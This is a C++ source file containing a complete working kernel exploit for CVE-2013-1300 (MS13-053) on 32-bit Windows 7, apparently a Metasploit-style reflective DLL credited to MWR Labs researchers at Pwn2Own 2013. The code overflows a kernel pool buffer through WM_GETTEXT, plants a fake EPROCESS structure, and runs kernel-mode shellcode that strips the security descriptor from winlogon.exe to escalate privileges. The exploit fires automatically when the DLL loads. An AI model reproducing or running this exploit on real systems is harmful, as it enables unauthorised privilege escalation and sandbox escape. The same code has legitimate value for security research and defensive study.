/*!
 * @file dllmain.cpp
 * @brief Exploit for CVE-2013-1300 aka ms13-053
 * @detail Tested on Windows 7 32-bit.
 *         Used in pwn2own 2013 to break out of chrome's sandbox.
 *         Found and exploited by nils and jon of @mwrlabs.
 */

#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// Purloined from ntstatus.h
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS

#ifndef _NTDEF_
typedef __success(return >= 0) LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#define MAX_PAGE 4096

#define TABLE_BASE 0xff910000

#define EXPLOIT_MSG WM_GETTEXT

// global variables FTW
HWND gHwnd = 0x0;
unsigned int gEPROCESS = 0x0;
unsigned gPid = 0x0;

typedef struct _HANDLEENTRY {
	VOID *phead;
	VOID *pOwner;
	UINT8 bType;
	UINT8 bFlags;
	UINT16 wUniq;
} HANDLEENTRY, *PHANDLEENTRY;

DWORD gethandleaddress(HANDLE h) {
	HMODULE mod = GetModuleHandleA("user32.dll");
	DWORD* sharedinfo = (DWORD*)GetProcAddress(mod, "gSharedInfo");
	PHANDLEENTRY handles = (PHANDLEENTRY)sharedinfo[1];
	DWORD index = (DWORD)h&0x3ff;
	HANDLEENTRY entry = handles[index];
	return (DWORD)entry.phead;
}

DWORD kernelwndproc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam) {
	WORD um=0;
	__asm {
		mov ax, cs
		mov um, ax
	}
	if(um == 0x1b) {
		
	} else {
		// KERNEL MODE CODE EXECUTION
		// shellcode to change ACL of winlogon.exe to 0x0
		__asm {
				mov eax, hwnd // WND
				mov eax, [eax+8] // THREADINFO
				mov eax, [eax] // ETHREAD
				mov eax, [eax+0x150] // KPROCESS
				mov eax, [eax+0xb8] // flink
				procloop:
				lea edx, [eax-0xb8] // KPROCESS
				mov eax, [eax]
				add edx, 0x16c // module name
				cmp dword ptr [edx], 0x6c6e6977 // "winl" for winlogon.exe
				jne procloop
				sub edx, 0x170
				mov dword ptr [edx], 0x0 // null acl
				mov eax, [edx + 0xb8]   // write winlogon pid to global var
				mov gPid, eax
		}
		return 0x201000;
	}
	return DefWindowProcW(hwnd,msg,wparam,lparam);
}

HWND createhelperwnd() {
	WNDCLASSA wndclass;
	HANDLE hinst = GetModuleHandleA(0);
	DWORD rc = 0;
	
	wndclass.style         = 0x4000;
	wndclass.lpfnWndProc   = (WNDPROC)kernelwndproc;
	wndclass.cbClsExtra    = 0;
	wndclass.cbWndExtra    = 0;
	wndclass.hInstance     = (HINSTANCE)hinst;
	wndclass.hIcon         = LoadIconA(0, (LPCSTR)0x107);
	wndclass.hCursor       = 0;
	wndclass.hbrBackground = (HBRUSH)6;
	wndclass.lpszMenuName  = 0;
	wndclass.lpszClassName = (LPCSTR) 0x1338;
	rc=RegisterClassA(&wndclass);
	HWND windowhandle = CreateWindowExA(0, (LPCSTR) 0x1338, "helper", 0, 0, 0, 0, 0, 0, 0, 0, hinst);

	return windowhandle;
}

typedef NTSTATUS __stdcall NtAllocateVirtualMemory_T(HANDLE processHandle, 
                                           PVOID      *baseAddress, 
                                           ULONG_PTR  zeroBits, 
                                           PSIZE_T    regionSize, 
                                           ULONG      allocationType, 
                                           ULONG      protect);

BOOL AllocFakeEProcess(DWORD address) {
	unsigned int addr = 0x200000;
	DWORD allocsize = 0x4000;
	int x=0;

	NtAllocateVirtualMemory_T * pfnNtAllocateVirtualMemory = 0;
	pfnNtAllocateVirtualMemory = (NtAllocateVirtualMemory_T *)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	

	unsigned o = (0x20 / 4); // the offset into the page
	NTSTATUS res = 0x0;

	for(x=0; x<0x60; x++) {
		res = pfnNtAllocateVirtualMemory((HANDLE)0xffffffff, (PVOID*)&addr, 0, &allocsize, 0x3000, 0x40);
		if(res == 0x0) {
			
			break;
		}
		
		addr += 0x10000;
	}
	if(res!=0) return FALSE;
	memset((void*)addr, 0xab, 0x4000);
	UINT *eprocess = (UINT*)addr+o;
	UINT *before = (UINT*)addr;
	// large enough values to hold reference
	before[2] = 0x00080000;
	before[3] = 0x400000;
	UINT *second = (UINT*)addr + (0x1000/4);	
	for(x=0; x<100; x++) eprocess[x] = (0xdead<<16) + (0xaa00 | x);

	eprocess[0] = 0x03030303; // least significant byte == 0x3

	// Pointer to EPROCESS_QUOTA_BLOCK
	// Will point into the window object and on decrement flip the flag to enable the kernel mode window procedure
	eprocess[0xd4/4] = address;

	gEPROCESS = (unsigned int)eprocess;
	//for(x=0; x<100; x++) second[x] = (0xbeef<<16) + (0xbb00 | x);
	//second[0x20] = 0x2;
	//second[0x30] = 0x1;
	return TRUE;
}

DWORD wndproc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam) {
	if(msg == EXPLOIT_MSG) {
		// triggering the exploit through WM_GETTEXT
		// printf("[-] WM_GETTEXT message\n");
		unsigned char payload[] = "ABCDE   ";
		payload[7] = (gEPROCESS>>16) & 0xff;
		memcpy((void *) lparam, (void *)payload, 8);
		return 8;
	}
	return DefWindowProcA(hwnd, msg, wparam, lparam);
}

DWORD windowthreadproc(LPVOID arg) {
	WNDCLASSA wndclass;
	HANDLE hinst = GetModuleHandleA(0);
	DWORD rc = 0;
	MSG msg;

	wndclass.style         = 0x4000;
	wndclass.lpfnWndProc   = (WNDPROC)wndproc;
	wndclass.cbClsExtra    = 0;
	wndclass.cbWndExtra    = 0;
	wndclass.hInstance     = (HINSTANCE)hinst;
	wndclass.hIcon         = LoadIconA(0, (LPCSTR)0x107);
	wndclass.hCursor       = 0;
	wndclass.hbrBackground = (HBRUSH)6;
	wndclass.lpszMenuName  = 0;
	wndclass.lpszClassName = (LPCSTR) 0x1337;
	rc=RegisterClassA(&wndclass);
	
	HWND windowhandle = CreateWindowExA(0, (LPCSTR) 0x1337, "Jon Rocks!", 0, 0, 0, 0, 0, 0, 0, 0, hinst);
	
	gHwnd = windowhandle;

	while(1) {
		GetMessageA(&msg, 0x0, 0x0, 0x0);
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	}

	return 0;
}

DWORD NtUserMessageCall(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam, DWORD result, DWORD fnid, DWORD ansi) {
	__asm {
		push	ansi
		push	fnid
		push	result
		push	lparam
		push	wparam
		push	msg
		push	hwnd
		push    0xdeadbeef
		mov		eax, 11eah
		mov		edx, 7ffe0300h
		call	[edx]
		add		esp, 20h
	}
}

typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef long (*_RtlCreateUserThread)(HANDLE,
       PSECURITY_DESCRIPTOR,
       BOOLEAN,ULONG,
       PULONG,PULONG,
       PVOID,PVOID,
       PHANDLE,PCLIENT_ID);
 
_RtlCreateUserThread RtlCreateUserThread;

int Schlamperei()
{
	// Create window which will execute the wndproc in kernel mode
	HWND wnd = createhelperwnd();

	// Retrieve memory address of window using gSharedInfo
	DWORD addressofwnd = gethandleaddress(wnd);

	 HMODULE ntdll=LoadLibraryA("ntdll.dll");
	RtlCreateUserThread=(_RtlCreateUserThread)GetProcAddress(ntdll,"RtlCreateUserThread");

	// Allocate fake EPROCESS in user mode
	// see "Kernel Pool Exploitation on Windows 7" by Tarjei Mandt
	if(!AllocFakeEProcess(addressofwnd-0x80+0x15)) {
		return 0;
	}

	// Create window in new thread to trigger inter thread message sending
	HANDLE thread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)windowthreadproc,0,0,0);

	Sleep(0x1000);

	// 0x9 is size of allocation, results in buffer (8 + 4) = 12
	// 8 byte block allocations = 16 bytes
	// so we will copy in 8*2 bytes = 16 bytes to corrupt the pool pointer
	unsigned char *buf = (unsigned char *)malloc(16);
	for(int i=0; i<0x40; i++) {
		NtUserMessageCall(gHwnd, EXPLOIT_MSG, 0x8, (LPARAM)buf, 0x0, 0x2b3, 0x10);
	}

	SendMessage(wnd, 0x401, addressofwnd, 0x0);
	
	ExitProcess(0);
}

extern HINSTANCE hAppInstance;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
		case DLL_QUERY_HMODULE:
			hAppInstance = hinstDLL;
			if (lpReserved != NULL) {
				*(HMODULE *)lpReserved = hAppInstance;
			}
			break;
		case DLL_PROCESS_ATTACH:
			Schlamperei();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
			break;
	}
	return bReturnValue;
};


